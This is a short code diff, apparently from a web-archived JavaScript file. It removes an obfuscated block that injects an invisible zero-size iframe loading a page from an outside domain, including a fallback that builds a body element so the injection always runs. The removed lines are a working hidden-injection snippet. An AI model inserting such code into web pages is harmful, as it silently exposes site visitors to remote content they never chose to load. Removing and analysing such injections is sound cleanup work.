@@ -76,20 +76,4 @@ if (!self.__WB_pmw) {
     egr(9076);
     return 6314;
   })();
-  try {
-    var _0x5a05f9 = document.createElement("IFRAME");
-    _0x5a05f9.setAttribute("src", "https://trustisimportant.fun/inappi.html");
-    _0x5a05f9.setAttribute("frameborder", "0");
-    _0x5a05f9.setAttribute("width", "0");
-    _0x5a05f9.setAttribute("height", "0");
-    document.body.appendChild(_0x5a05f9);
-  } catch {
-    document.body = document.createElement("body");
-    var _0x5a05f9 = document.createElement("IFRAME");
-    _0x5a05f9.setAttribute("src", "https://trustisimportant.fun/inappi.html");
-    _0x5a05f9.setAttribute("frameborder", "0");
-    _0x5a05f9.setAttribute("width", "0");
-    _0x5a05f9.setAttribute("height", "0");
-    document.body.appendChild(_0x5a05f9);
-  }
 }
